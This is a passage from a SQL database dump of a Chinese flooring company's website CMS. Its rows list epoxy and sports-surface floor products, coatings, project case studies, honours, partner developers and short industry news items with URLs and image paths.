场、医药生产车间、电子设备车间、汽车制造车间或维修车间、办公室、公寓、民用住房、百货店、超市、医院等地面的装饰。性能特点：1、平整，',0),(27,9,0,0,0,0,'','27',1,'admin',0,0,1,0,0,0,0,1586936044,1586936044,1,0,0,'','/cpzx/gdsydp/27.html',1,1,1,'','环氧磨石地坪',1586936018,'/d/file/22eddbaef9cd1e959e6875db9853ca19.jpg',0,'','适用范围：适用于大型商场、中高档商业大厦、豪华会所、展示厅、酒店大堂、住宅和别墅的地面装修。性能特点：1、拥有环氧树脂地坪的所有优异性能；2、可以设计成各种图案、体现设',0),(28,9,0,0,0,0,'','28',1,'admin',0,0,1,0,0,0,0,1586936077,1586936077,1,0,0,'','/cpzx/gdsydp/28.html',1,1,1,'','环氧彩砂地坪',1586936047,'/d/file/c5af5b6a0bca674a0872d5f6b20533c0.jpg',0,'','适用范围：要求耐磨损，耐强力冲击，装饰高档场合，具有一定地坪风格，特别适用于机场、大型商场、展览厅、地铁、电子通讯、医疗卫生、高级娱乐及商用大楼、食品生产、办公室及学校的',0),(29,10,0,0,0,0,'','29',1,'admin',0,0,1,0,0,0,0,1586939872,1586939872,1,0,0,'','/cpzx/hwydcs/29.html',1,1,1,'','改性环氧彩色防滑路面',1586939847,'/d/file/98e5875cc6a54bfff2845b947404a777.jpg',0,'','适用范围适用于高速公路地面如收费站、弯道及隧道等需减速区域;城市人行道路、登山步道、斑马线、车库坡道、园林道路、城市广场小路、沿河景观道路、自行车道;高档住宅小区',0),(30,10,0,0,0,0,'','30',1,'admin',0,0,1,0,0,0,0,1586939898,1586939898,1,0,0,'','/cpzx/hwydcs/30.html',1,1,1,'','悬浮拼装地板',1586939874,'/d/file/4c0ff10d3f36abf5af89bf790145e0ea.jpg',0,'','适用范围：室内/外全天候使用，用于篮球、排球、网球、五人制足球、羽毛球、乒乓球及其它多功能锻炼场地。性能特点：悬浮式；结构性缓冲；自排水；多功能性；方便性；环保性；健康性；舒适性；耐',0),(31,10,0,0,0,0,'','31',1,'admin',0,0,1,0,0,0,0,1586939916,1586939916,1,0,0,'','/cpzx/hwydcs/31.html',1,1,1,'','人造草坪',1586939900,'/d/file/56564cd1ff584fdc791845d1be5f4a00.jpg',0,'','适用范围：适用于足球场、网球场、游泳池周围或美化环境。性能特点：1、色泽鲜明；2、运动反弹力与天然草相似；3、适合各种气候独有的摩擦力；4、对皮肤几乎没有伤害；5、防紫外线，防腐',0),(32,10,0,0,0,0,'','32',1,'admin',0,0,1,0,0,0,0,1586939940,1586939940,1,0,0,'','/cpzx/hwydcs/32.html',1,1,1,'','塑胶跑道地坪',1586939919,'/d/file/62108ffd08c75badccf60f122e81ec01.jpg',0,'','适用范围：适用于幼儿园各级各类学校及专业体育场、田径场跑道、半圆区、辅助区，全民健身路径，室内体育馆训练跑道，游乐场道路铺面，室内外跑道、公园、居民小区等活动场地。性能特',0),(33,10,0,0,0,0,'','33',1,'admin',0,0,1,0,0,0,0,1586939964,1586939964,1,0,0,'','/cpzx/hwydcs/33.html',1,1,1,'','硅PU运动场地坪',1586939942,'/d/file/c73ccff909ae81d7b5e656cbffbd00bc.jpg',0,'','适用范围：1、网球场、篮球场、排球场等各种运动场所；2、儿童乐园、幼儿园活动场；3、人行步道、社区、游乐场等彩色涂装。性能特点：无缝防压，耐磨防滑、耐酸抗碱、防霉防水，外观亮',0),(34,10,0,0,0,0,'','34',1,'admin',0,0,1,0,0,0,0,1586939990,1586939990,1,0,0,'','/cpzx/hwydcs/34.html',1,1,1,'','丙烯酸运动场地坪',1586939966,'/d/file/deb45c4594a411db8e38b8acc8ca645c.jpg',0,'','适用范围：网球场、篮球场、羽毛球场、排球场、手球场、乒乓球场、室内足球场等运动场所。性能特点：1、水性无毒，为环保型材料；2、颜色多样，色彩鲜艳，不褪色，不变色，具防紫外线性能；3',0),(35,10,0,0,0,0,'','35',1,'admin',0,0,1,0,0,0,0,1586940010,1586940010,1,0,0,'','/cpzx/hwydcs/35.html',1,1,1,'','透水地坪',1586939993,'/d/file/fab357da3e8eff62bc2491d531dd47a6.jpg',0,'','适用范围：广泛适用于市政步道、园林小路、城市广场、高档住宅小区、停车场、商务办公大楼、户外运动场所（羽毛球场馆、篮球场馆等）。性能特点：1、高透水性；2、高承载力；3、良好的',0),(36,11,0,0,0,0,'','36',1,'admin',0,0,1,0,0,0,0,1586940092,1586940092,1,0,0,'','/cpzx/dpcl/36.html',1,1,1,'','水性环氧涂料',1586940075,'/d/file/115afa521e5968e79aa4c90ab315adc8.jpg',0,'','产品介绍水性面漆系我司优选进口水性环氧树脂，高效表面助剂，并配合进口水性固化剂等原材料，通过先进的生产工艺调配而成，是一种无VOC、环保、高粘结强度、低粘度的高性能面涂材',0),(37,11,0,0,0,0,'','37',1,'admin',0,0,1,0,0,0,0,1586940153,1586940153,1,0,0,'','/cpzx/dpcl/37.html',1,1,1,'','环氧自流平面漆',1586940094,'/d/file/285046d7e3c189bc2a1b62fd7e4a90c6.jpg',0,'','概要本品为双组份无溶剂环氧体系，采用国际品牌优质环氧树脂和固化剂精心配制而成。适用于轻至中等载荷的工业地坪，如机械、电子、医药、食品、轻纺等行业的仓库、车间，亦可用于',0),(38,11,0,0,0,0,'','38',1,'admin',0,0,1,0,0,0,0,1586940176,1586940176,1,0,0,'','/cpzx/dpcl/38.html',1,1,1,'','环氧磨石涂料',1586940155,'/d/file/84bc5647393d1dc56a23bd16c8682c09.jpg',0,'','概要环氧磨石涂料先进的配方允许使用在高质量装饰性黄铜条，并保证不褪色。环氧磨石涂料是在安装过程 中有最小气味的高固体份树脂粘合剂。此外，它具有高物理强度，耐磨损，耐化学',0),(39,11,0,0,0,0,'','39',1,'admin',0,0,1,0,0,0,0,1586940206,1586940206,1,0,0,'','/cpzx/dpcl/39.html',1,1,1,'','环氧防静电涂料',1586940188,'/d/file/40f61a5e2a8992ca5703ddafb894e67f.jpg',0,'','产品介绍防静电面漆系我司优选进口环氧树脂，高效表面助剂，高性能导电助剂、并配合进口固化剂等原材料，通过先进的生产工艺调配而成，是一种低VOC、环保、高粘结强度、低粘度的高',0),(40,11,0,0,0,0,'','40',1,'admin',0,0,1,0,0,0,0,1586940246,1586940246,1,0,0,'','/cpzx/dpcl/40.html',1,1,1,'','环氧中涂',1586940208,'/d/file/47fc22e2d739621dba2df058c2491aa1.jpg',0,'','适用范围适用于生产性工业厂房、仓库、实验室等水泥地坪的耐磨、防尘、防腐涂装。主要性能：1、涂层平整光洁，色泽艳丽，装饰效果佳。2、附着力强，不易起壳开裂。3、抗压、耐磨，寿',0),(41,11,0,0,0,0,'','41',1,'admin',0,0,1,0,0,0,0,1586940270,1586940270,1,0,0,'','/cpzx/dpcl/41.html',1,1,1,'','环氧平涂面漆',1586940248,'/d/file/62b2cf0298b630a5674b10f200bcb05a.jpg',0,'','概要本品为双组份环氧树脂高级地坪涂料，高固体含量，涂层与底涂附着力优异，耐磨、抗冲击、硬度高。适用于生产性工业厂房、仓库、实验室等水泥地坪的耐磨、防尘、防腐涂装。性能',0),(42,11,0,0,0,0,'','42',1,'admin',0,0,1,0,0,0,0,1586940297,1586940297,1,0,0,'','/cpzx/dpcl/42.html',1,1,1,'','环氧底涂',1586940272,'/d/file/4e94addbe8766c8c196896e27ad683ab.jpg',0,'','适用范围：适用于轻载至中等载荷的车间地坪、仓库地坪、加油站、油库、化学品储槽等地坪漆涂装系统。 主要性能：1、粘度底，对水泥基面有很好的附着力。2、具有良好的硬度、柔韧',0),(43,18,0,0,0,0,'','43',1,'admin',0,0,1,0,0,0,0,1586940580,1586940600,1,0,0,'','/gcal/zxal/43.html',1,1,1,'','昌平科兴车间自流平',1586940549,'/d/file/64a1eb39b342c411496dfb98da9145b3.jpg',0,'','',0),(44,18,0,0,0,0,'','44',1,'admin',0,0,1,0,0,0,0,1586940630,1586940630,1,0,0,'','/gcal/zxal/44.html',1,1,1,'','昌平乐多港环氧磨石',1586940604,'/d/file/645fc7481a88a327945b377306cde7e4.jpg',0,'','',0),(45,18,0,0,0,0,'','45',1,'admin',0,0,1,0,0,0,0,1586940653,1586940653,1,0,0,'','/gcal/zxal/45.html',1,1,1,'','怀来瑞士公馆车库坡道',1586940632,'/d/file/6a946bbeb4b448e6e7fc4cef834e2a25.jpg',0,'','',0),(46,18,0,0,0,0,'','46',1,'admin',0,0,1,0,0,0,0,1586940679,1586940679,1,0,0,'','/gcal/zxal/46.html',1,1,1,'','百度云计算中心自流平',1586940655,'/d/file/fd32c6388369ce0607a8cf51608dcfbe.jpg',0,'','',0),(47,18,0,0,0,0,'','47',1,'admin',0,0,1,0,0,0,0,1586940704,1586940704,1,0,0,'','/gcal/zxal/47.html',1,1,1,'','北京奥体南区4号地车库自流平',1586940681,'/d/file/3afdb7076eeb8cb1c7413ab261b17a2e.jpg',0,'','',0),(48,18,0,0,0,0,'','48',1,'admin',0,0,1,0,0,0,0,1586940725,1586940725,1,0,0,'','/gcal/zxal/48.html',1,1,1,'','北京奔驰车间固化地坪',1586940706,'/d/file/3f3ec9dfcafcfa3edd937cd44b84b522.jpg',0,'','',0),(49,18,0,0,0,0,'','49',1,'admin',0,0,1,0,0,0,0,1586940744,1586940744,1,0,0,'','/gcal/zxal/49.html',1,1,1,'','北京康尔福药厂车间自流平',1586940728,'/d/file/0e708e9b4011be6d496af1d895dece12.jpg',0,'','',0),(170,22,0,0,0,0,'2020-05-12','170',1,'admin',0,0,1,0,0,0,0,1589268474,1589268719,1,0,0,'','/cpzx/hntjg/2020-05-12/170.html',1,1,1,'','混凝土激光整平1',1589268238,'/d/file/997be3471ce4e4929e28759e337e902b.jpg',0,'','',0),(51,18,0,0,0,0,'','51',1,'admin',0,0,1,0,0,0,0,1586940784,1586940784,1,0,0,'','/gcal/zxal/51.html',1,1,1,'','北京网易大厦水泥自流平磨石',1586940764,'/d/file/353dd83cdb630f286f6d6d2dfc3efee2.jpg',0,'','',0),(52,18,0,0,0,0,'','52',1,'admin',0,0,1,0,0,0,0,1586940800,1586940800,1,0,0,'','/gcal/zxal/52.html',1,1,1,'','北京小飞机控股EPDM',1586940787,'/d/file/8d7feed4ea33bb9eda8278146d00a51e.jpg',0,'','',0),(53,18,0,0,0,0,'','53',1,'admin',0,0,1,0,0,0,0,1586940818,1586940818,1,0,0,'','/gcal/zxal/53.html',1,1,1,'','昌平东升联创静电平涂',1586940803,'/d/file/e3fcc80a7cd0d6ecd3b5e3184d4d26f5.jpg',0,'','',0),(54,15,0,0,0,0,'','54',1,'admin',0,0,0,0,0,0,0,1586940885,1586940885,1,0,0,'','/xwzx/qyzx/54.html',1,1,1,'','地坪行业一项重大突破',1586940875,'',0,'','地坪行业一项重大突破，解决了环氧地坪对素地要求较高的难题。\r\n         丽邦公司**新引进台湾水性环氧新配方：已经完成对上万平米毛坯翻砂地面的实践，水性环氧和油性环氧相结合',0),(55,15,0,0,0,0,'','55',1,'admin',0,0,0,0,0,0,0,1586940922,1586940922,1,0,0,'','/xwzx/qyzx/55.html',1,1,1,'','现代工业对地坪漆的要求越来越严格',1586940887,'',0,'','&ldquo;绿色环保建材调研&rdquo;地坪漆生产厂家小组的记者队员们先后走访了各建材市场，为了深入的了解绿色环保市场，记者们针对板材、涂料、贴面三大类建材展开专项研讨，同环保',0),(56,15,0,0,0,0,'','56',1,'admin',0,0,0,0,0,0,0,1586940955,1586940955,1,0,0,'','/xwzx/qyzx/56.html',1,1,1,'','防静电地坪漆渗透剂具备极好的黏着力',1586940924,'',0,'','防静电地坪漆润程度只是在过大的事情状况下才影响地坪涂装，但它的影响要远长远于许多人的假想。相对湿润程度过高，有可能引动涂装外表结露，对于溶剂型胺固化环氧气地坪，凝固水会',0),(57,15,0,0,0,0,'','57',1,'admin',0,0,0,0,0,0,0,1586940975,1586940975,1,0,0,'','/xwzx/qyzx/57.html',1,1,1,'','停车场地坪漆复合材料的到来',1586940957,'',0,'','相信大家也认识，静电地坪漆、环氧树脂地坪、停车场地坪漆、汤谱地坪漆&amp;hellip;&amp;hellip;但是还有一种新的名字，您是否也听过了呢？\r\n　　那就是停车场地坪漆复合材料的到来。\r\n　　',0),(58,15,0,0,0,0,'','58',1,'admin',0,0,0,0,0,0,0,1586940998,1586940998,1,0,0,'','/xwzx/qyzx/58.html',1,1,1,'','地坪工程定义和按材料分类',1586940977,'',0,'','地坪工程指作为土建后续适应多种用途需要的特种地面。地坪因适用范围不同而要求各异，主要包括适应车行道、停车场、物流仓库等的高冲击、高耐磨的要求；机械加工车间地面防油渗',0),(59,15,0,0,0,0,'','59',1,'admin',0,0,0,0,0,0,0,1586941030,1586941030,1,0,0,'','/xwzx/qyzx/59.html',1,1,1,'','关于地坪涂料的环保性能和毒性测试',1586941000,'',0,'','关于地坪涂料的环保性能和毒性，情况如下： 　　\r\n一、溶剂型地坪漆主要成份及毒性说明：\r\n    1、环氧树脂和固化剂：环氧树脂和固化剂单独时有毒，但它们反应后的固化物可做到无毒，符合',0),(60,15,0,0,0,0,'','60',1,'admin',0,0,1,0,0,0,0,1586941059,1586941428,1,0,0,'','/xwzx/qyzx/60.html',1,1,1,'','工业地坪设计与基础要求及处理',1586941043,'/d/file/fe3d38149d28f8b9b8d4d7e0209802c5.jpg',0,'','● 工业地坪设计与参考指南 \r\n     1、投资计划：根据建筑物地面设计使用的年限选择择，避免重复建设； \r\n     2、使用表面效果：如平整度、亮度、色泽等； \r\n     3、使用性能：根据建筑',0),(61,15,0,0,0,0,'','61',1,'admin',0,0,1,0,0,0,0,1586941079,1586941405,1,0,0,'','/xwzx/qyzx/61.html',1,1,1,'','地坪的服务范围',1586941061,'/d/file/9f8f930f862ff797a1d8ab3c3e8e7533.jpg',0,'','地坪在各领域的八大服务范围：\r\n● 飞机汽车车间\r\n    主要施工地坪有飞机制造车间、飞机维修车间、飞机展示车间，汽车生产车间、汽车维修车间、汽车展示车间，动车、高铁、地铁的',0),(62,15,0,0,0,0,'','62',1,'admin',0,0,1,0,0,0,0,1586941107,1586941392,1,0,0,'','/xwzx/qyzx/62.html',1,1,1,'','如何选择地坪？',1586941081,'/d/file/d86b3cb7b38d617587dbf19781fe939c.jpg',0,'','一、机械性能要求\r\n主要以下三个方面：\r\n1. 耐磨性：地坪在使用时会有哪些车辆行走？\r\n2. 耐压性：地坪在使用时会承受多大荷载？\r\n3. 耐冲击性：冲击力是否会引起地坪面起壳、剥离？\r\n二、化学\r\n',0),(63,15,0,0,0,0,'','63',1,'admin',0,0,1,0,0,0,0,1586941124,1586941377,1,0,0,'','/xwzx/qyzx/63.html',1,1,1,'','地坪的用途',1586941110,'/d/file/283217daf1c073f91d893eba610be26b.jpg',0,'','地坪是底层房间与土层相接触的部分，它承受底层房间的荷载，要求具有一定的强度和刚度，并具有防潮、防水、保暖、耐磨的性能。地层和建筑物室外场地有密切的关系，要处理好地坪与平',0),(179,20,0,0,0,0,'','179',1,'admin',0,0,1,0,0,0,0,1646374817,1646375047,1,0,0,'','/gssl/ryzz/179.html',1,1,1,'','资质2',1646374800,'/d/file/aad6f18e8434bf5bf0f6abae61584da8.jpg',0,'','',0),(178,20,0,0,0,0,'','178',1,'admin',0,0,1,0,0,0,0,1646371010,1646375037,1,0,0,'','/gssl/ryzz/178.html',1,1,1,'','资质1',1646371004,'/d/file/4f263dd5d1acf9b0215baaaa53b0a6f0.jpg',0,'','',0),(177,26,0,0,0,0,'2020-05-12','177',1,'admin',0,0,1,0,0,0,0,1589269429,1589269429,1,0,0,'','/cpzx/tshnt/2020-05-12/177.html',1,1,1,'','透水混凝土4',1589269408,'/d/file/74520e9d913b8ddb4cb0d80a09c49cb7.jpg',0,'','',0),(176,26,0,0,0,0,'2020-05-12','176',1,'admin',0,0,1,0,0,0,0,1589269404,1589269404,1,0,0,'','/cpzx/tshnt/2020-05-12/176.html',1,1,1,'','透水混凝土3',1589269385,'/d/file/1f3e67d5fada2884c1cf91e71743801a.jpg',0,'','',0),(175,26,0,0,0,0,'2020-05-12','175',1,'admin',0,0,1,0,0,0,0,1589269381,1589269381,1,0,0,'','/cpzx/tshnt/2020-05-12/175.html',1,1,1,'','透水混凝土2',1589269354,'/d/file/54a3b4738c0e98e37453fa7634d73e8d.jpg',0,'','',0),(169,20,0,0,0,0,'','169',1,'admin',0,0,1,0,0,0,0,1588734876,1588735125,1,0,0,'','/gssl/ryzz/169.html',1,1,1,'','荣誉1',1588734854,'/d/file/9b99693d85f3f0d709e6a272c2850b04.jpg',0,'','',0),(168,20,0,0,0,0,'','168',1,'admin',0,0,1,0,0,0,0,1588734852,1588734920,1,0,0,'','/gssl/ryzz/168.html',1,1,1,'','荣誉2',1588734824,'/d/file/3c65b6c70740b23c3c14213424942d13.jpg',0,'','',0),(167,20,0,0,0,0,'','167',1,'admin',0,0,1,0,0,0,0,1588734822,1588735134,1,0,0,'','/gssl/ryzz/167.html',1,1,1,'','荣誉3',1588734320,'/d/file/be9769bf638fa200e948894827d4ed70.jpg',0,'','',0),(74,21,0,0,0,0,'','74',1,'admin',0,0,1,0,0,0,0,1587006721,1587006721,1,0,0,'','/gssl/hzhb/74.html',1,1,1,'','碧桂园',1587006703,'/d/file/c6209928fc7aa5ea6304aac0472d5b2a.jpg',0,'','',0),(75,21,0,0,0,0,'','75',1,'admin',0,0,1,0,0,0,0,1587006739,1587006739,1,0,0,'','/gssl/hzhb/75.html',1,1,1,'','龙湖地产',1587006723,'/d/file/8f91e93abf1a60248efa99d4b36ca547.jpg',0,'','',0),(76,21,0,0,0,0,'','76',1,'admin',0,0,1,0,0,0,0,1587006761,1587006761,1,0,0,'','/gssl/hzhb/76.html',1,1,1,'','新田集团',1587006741,'/d/file/a7421633c7da754e2625e53272dd3e7d.jpg',0,'','',0),(77,21,0,0,0,0,'','77',1,'admin',0,0,1,0,0,0,0,1587006783,1587006783,1,0,0,'','/gssl/hzhb/77.html',1,1,1,'','金科',1587006763,'/d/file/e4a20ae1990558b158d7ea46b6a3b377.jpg',0,'','',0),(78,21,0,0,0,0,'','78',1,'admin',0,0,1,0,0,0,0,1587006810,1587006810,1,0,0,'','/gssl/hzhb/78.html',1,1,1,'','置信地产',1587006785,'/d/file/435fb4aa81e010b3256bad6550e677b1.jpg',0,'','',0),(79,21,0,0,0,0,'','79',1,'admin',0,0,1,0,0,0,0,1587006844,1587006844,1,0,0,'','/gssl/hzhb/79.html',1,1,1,'','中铁置业',1587006812,'/d/file/c35dcd31146b4f125b4f816f3eed1fef.jpg',0,'','',0),(80,21,0,0,0,0,'','80',1,'admin',0,0,1,0,0,0,0,1587006865,1587006865,1,0,0,'','/gssl/hzhb/80.html',1,1,1,'','建业集团',1587006847,'/d/file/f1c3a9a373bda33b39b6cd5da0c5e18f.jpg',0,'','',0),(81,13,0,0,0,0,'','index',1,'admin',0,0,0,0,0,0,0,1587021353,1587021505,1,0,0,'','/gywm/qywh/index.html',1,1,1,'','企业文化',1587021343,'',0,'','企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化企业文化',0),(92,14,0,0,0,0,'','index',1,'admin',0,0,0,0,0,0,0,1587611738,1588745121,1,0,0,'','/gywm/gsfc/index.html',1,1,1,'','公司一角',1587611642,'',0,'',' \r\n \r\n \r\n',0),(93,18,0,0,0,0,'','93',1,'admin',0,0,1,0,0,0,0,1587616148,1587616148,1,0,0,'','/gcal/zxal/93.html',1,1,1,'','成都易上集团OCG地下车库聚氨脂地坪',1587616116,'/d/file/31296dfa84551f0fca36ff6f02ece04a.png',0,'','',0),(94,18,0,0,0,0,'','94',1,'admin',0,0,1,0,0,0,0,1587616170,1587616170,1,0,0,'','/gcal/zxal/94.html',1,1,1,'','南部县大润发地下车库砂浆地坪',1587616150,'/d/file/d90bfbfd9fa46e82b4e3d2bfa3d6992c.png',0,'','',0),(95,18,0,0,0,0,'','95',1,'admin',0,0,1,0,0,0,0,1587616196,1587616196,1,0,0,'','/gcal/zxal/95.html',1,1,1,'','南充市航务局地下车库聚氨脂地坪',1587616173,'/d/file/ad16a75ca2f15c844e116d3371ef3bc1.png',0,'','',0),(99,18,0,0,0,0,'','99',1,'admin',0,0,1,0,0,0,0,1587621056,1587621056,1,0,0,'','/gcal/zxal/99.html',1,1,1,'','南充市中心医院地下车库环氧砂浆地',1587621030,'/d/file/701201e49e7d074698c59fb8c9342cf9.png',0,'','',0),(100,18,0,0,0,0,'','100',1,'admin',0,0,1,0,0,0,0,1587621082,1587621082,1,0,0,'','/gcal/zxal/100.html',1,1,1,'','遂宁金海国际地下车库环氧地坪',1587621058,'/d/file/b9b9d50c7aff30eafc5cf0f194602db0.png',0,'','',0),(98,18,0,0,0,0,'','98',1,'admin',0,0,1,0,0,0,0,1587616505,1587616505,1,0,0,'','/gcal/zxal/98.html',1,1,1,'','条纹防滑坡道',1587616484,'/d/file/d9940365a174750369738d11cd85523c.png',0,'','',0),(101,11,0,0,0,0,'','101',1,'admin',0,0,1,0,0,0,0,1587621370,1587621370,1,0,0,'','/cpzx/dpcl/101.html',1,1,1,'','丽邦环氧树脂材料',1587621337,'/d/file/4ae5f90d4bfc61e952beba3cc74f6409.jpg',0,'','',0),(102,20,0,0,0,0,'','102',1,'admin',0,0,1,0,0,0,0,1587621959,1589267658,1,0,0,'','/gssl/ryzz/102.html',1,1,1,'','荣誉7',1587621940,'/d/file/fee9bd2464daca04f864a0dae88831f5.jpg',0,'','',0),(103,20,0,0,0,0,'','103',1,'admin',0,0,1,0,0,0,0,1587621976,1589267649,1,0,0,'','/gssl/ryzz/103.html',1,1,1,'','荣誉6',1587621961,'/d/file/ec5ecec9b241485dd967eb78f3eba0d5.jpg',0,'','',0),(104,20,0,0,0,0,'','104',1,'admin',0,0,1,0,0,0,0,1587621999,1589267641,1,0,0,'','/gssl/ryzz/104.html',1,1,1,'','荣誉5',1587621978,'/d/file/9ec8ca9119018760ffa182c6cc7672bd.jpg',0,'','',0),(105,20,0,0,0,0,'','105',1,'admin',0,0,1,0,0,0,0,1587622038,1589267634,1,0,0,'','/gssl/ryzz/105.html',1,1,1,'','荣誉4',1587622023,'/d/file/fc08af9f830ef6ca1cc909e93ecc0293.jpg',0,'','',0),(173,22,0,0,0,0,'2020-05-12','173',1,'admin',0,0,1,0,0,0,0,1589268880,1589268880,1,0,0,'','/cpzx/hntjg/2020-05-12/173.html',1,1,1,'','混凝土激光整平4',1589268852,'/d/file/c6f0bdd05658aef46b2787ad1af485fc.jpg',0,'','',0),(172,22,0,0,0,0,'2020-05-12','172',1,'admin',0,0,1,0,0,0,0,1589268849,1589268889,1,0,0,'','/cpzx/hntjg/2020-05-12/172.html',1,1,1,'','混凝土激光整平3',1589268816,'/d/file/71553116311ed81ce1d7a40f76cb6bd8.jpg',0,'','',0),(171,22,0,0,0,0,'2020-05-12','171',1,'admin',0,0,1,0,0,0,0,1589268810,1589268810,1,0,0,'','/cpzx/hntjg/2020-05-12/171.html',1,1,1,'','混凝土激光整平2',1589268738,'/d/file/6f77c86ddeb672de3d00df5c40d30152.jpg',0,'','',0),(147,18,0,0,0,0,'','147',1,'admin',0,0,1,0,0,0,0,1587698300,1587698870,1,0,0,'','/gcal/zxal/147.html',1,1,1,'','白塔耍都环氧砂浆地坪案例',1587697981,'/d/file/1ac6c9b5756439566e0e11bb2eccaffd.jpg',0,'','',0),(117,8,0,0,0,0,'','117',1,'admin',0,0,1,0,0,0,0,1587695426,1587695426,1,0,0,'','/cpzx/hydp/117.html',1,1,1,'','车库环氧地坪1',1587695359,'/d/file/4c8a686cd67df8e93b59b0ac05172a01.jpg',0,'','',0),(118,8,0,0,0,0,'','118',1,'admin',0,0,1,0,0,0,0,1587695443,1587695443,1,0,0,'','/cpzx/hydp/118.html',1,1,1,'','车库环氧地坪2',1587695428,'/d/file/e01e6e38be644fcd1bb42f826cb3c6e4.jpg',0,'','',0),(174,26,0,0,0,0,'2020-05-12','174',1,'admin',0,0,1,0,0,0,0,1589269349,1589269349,1,0,0,'','/cpzx/tshnt/2020-05-12/174.html',1,1,1,'','透水混凝土1',1589269313,'/d/file/6b4ffdeeb9a4c789fd8adf38958e7a0c.jpg',0,'','',0),(120,8,0,0,0,0,'','120',1,'admin',0,0,1,0,0,0,0,1587695483,1589269102,1,0,0,'','/cpzx/hydp/120.html',1,1,1,'','车库环氧地坪3',1587695471,'/d/file/ed15632bd6d18215ff996fa82098742e.jpg',0,'','',0),(121,8,0,0,0,0,'','121',1,'admin',0,0,1,0,0,0,0,1587695498,1589269112,1,0,0,'','/cpzx/hydp/121.html',1,1,1,'','车库环氧地坪4',1587695485,'/d/file/d80a65e222178f50a7208799ee7263d2.jpg',0,'','',0),(122,8,0,0,0,0,'','122',1,'admin',0,0,1,0,0,0,0,1587695512,1589269122,1,0,0,'','/cpzx/hydp/122.html',1,1,1,'','车库环氧地坪5',1587695500,'/d/file/0091abdf403990a295bb2043b7b08847.jpg',0,'','',0),(123,8,0,0,0,0,'','123',1,'admin',0,0,1,0,0,0,0,1587695526,1589269131,1,0,0,'','/cpzx/hydp/123.html',1,1,1,'','车库环氧地坪6',1587695514,'/d/file/86166bed71e45ce64837649eef09797a.jpg',0,'','',0),(124,8,0,0,0,0,'','124',1,'admin',0,0,1,0,0,0,0,1587695543,1589269140,1,0,0,'','/cpzx/hydp/124.html',1,1,1,'','车库环氧地坪7',1587695529,'/d/file/eaf0210937750a13a2783c7d63964223.jpg',0,'','',0),(125,8,0,0,0,0,'','125',1,'admin',0,0,1,0,0,0,0,1587695562,1589269149,1,0,0,'','/cpzx/hydp/125.html',1,1,1,'','车库环氧地坪8',1587695545,'/d/file/dae5b26c07914937ea42ab3d94d05692.jpg',0,'','',0),(126,8,0,0,0,0,'','126',1,'admin',0,0,1,0,0,0,0,1587695577,1589269158,1,0,0,'','/cpzx/hydp/126.html',1,1,1,'','车库环氧地坪9',1587695564,'/d/file/c835d6512221cf1fff7531a5f5ac1175.jpg',0,'','',0),(127,8,0,0,0,0,'','127',1,'admin',0,0,1,0,0,0,0,1587695594,1589269167,1,0,0,'','/cpzx/hydp/127.html',1,1,1,'','车库环氧地坪10',1587695579,'/d/file/ea57f0fb79221e3ce576679dffbfb830.jpg',0,'','',0),(128,24,0,0,0,0,'2020-04-24','128',1,'admin',0,0,1,0,0,0,0,1587695644,1587695669,1,0,0,'','/cpzx/ghjdp/2020-04-24/128.html',1,1,1,'','混凝土固化地坪',1587695624,'/d/file/2b7f582148a68dd26c6dd38bc009651e.jpg',0,'','',0),(129,24,0,0,0,0,'2020-04-24','129',1,'admin',0,0,1,0,0,0,0,1587695694,1587695694,1,0,0,'','/cpzx/ghjdp/2020-04-24/129.html',1,1,1,'','固化剂地坪1',1587695672,'/d/file/9ca08a536a1cd9bd5f2973c185beaf26.jpg',0,'','',0),(130,24,0,0,0,0,'2020-04-24','130',1,'admin',0,0,1,0,0,0,0,1587695708,1587695708,1,0,0,'','/cpzx/ghjdp/2020-04-24/130.html',1,1,1,'','固化剂地坪2',1587695696,'/d/file/97e9f6457f532ea8cf43c9d285819f3f.jpg',0,'','',0),(131,24,0,0,0,0,'2020-04-24','131',1,'admin',0,0,1,0,0,0,0,1587695722,1587695722,1,0,0,'','/cpzx/ghjdp/2020-04-24/131.html',1,1,1,'','固化剂地坪4',1587695711,'/d/file/8e9b5def4f86b2381eca7524cc6a4d8d.jpg',0,'','',0),(132,23,0,0,0,0,'2020-04-24','132',1,'admin',0,0,1,0,0,0,0,1587695798,1587695798,1,0,0,'','/cpzx/jtanss/2020-04-24/132.html',1,1,1,'','交通安全设施1',1587695771,'/d/file/c020a0a4ea4ed7ac157bca104f29eac8.jpg',0,'','',0),(133,23,0,0,0,0,'2020-04-24','133',1,'admin',0,0,1,0,0,0,0,1587695813,1587695813,1,0,0,'','/cpzx/jtanss/2020-04-24/133.html',1,1,1,'','交通安全设施2',1587695800,'/d/file/3d4c788ffc11c8e60be3cc47545b6f1b.jpg',0,'','',0),(134,23,0,0,0,0,'2020-04-24','134',1,'admin',0,0,1,0,0,0,0,1587695826,1587695826,1,0,0,'','/cpzx/jtanss/2020-04-24/134.html',1,1,1,'','交通安全设施3',1587695815,'/d/file/1e4a96cbe29b827d29864b0d57bfee40.jpg',0,'','',0),(135,23,0,0,0,0,'2020-04-24','135',1,'admin',0,0,1,0,0,0,0,1587695846,1587695846,1,0,0,'','/cpzx/jtanss/2020-04-24/135.html',1,1,1,'','交通安全设施4',1587695828,'/d/file/0b9fffefb688ded529171d38861276ed.jpg',0,'','',0),(136,23,0,0,0,0,'2020-04-24','136',1,'admin',0,0,1,0,0,0,0,1587695863,1587695863,1,0,0,'','/cpzx/jtanss/2020-04-24/136.html',1,1,1,'','交通安全设施5',1587695848,'/d/file/ecd32d2cc7e2adbb77a29d013964153a.jpg',0,'','',0),(137,23,0,0,0,0,'2020-04-24','137',1,'admin',0,0,1,0,0,0,0,1587695877,1587695877,1,0,0,'','/cpzx/jtanss/2020-04-24/137.html',1,1,1,'','交通安全设施6',1587695865,'/d/file/0e0ea6fafaacb7ad54cbfc7ecc1b5d98.jpg',0,'','',0),(138,23,0,0,0,0,'2020-04-24','138',1,'admin',0,0,1,0,0,0,0,1587695893,1587695893,1,0,0,'','/cpzx/jtanss/2020-04-24/138.html',1,1,1,'','交通安全设施7',1587695879,'/d/file/840e98c634847e85a190e3ad17e272df.jpg',0,'','',0),(139,23,0,0,0,0,'2020-04-24','139',1,'admin',0,0,1,0,0,0,0,1587695906,1587695906,1,0,0,'','/cpzx/jtanss/2020-04-24/139.html',1,1,1,'','交通安全设施8',1587695895,'/d/file/0c5cdd981e60e1cfb55283d82fdff3c7.jpg',0,'','',0),(140,23,0,0,0,0,'2020-04-24','140',1,'admin',0,0,1,0,0,0,0,1587695926,158769592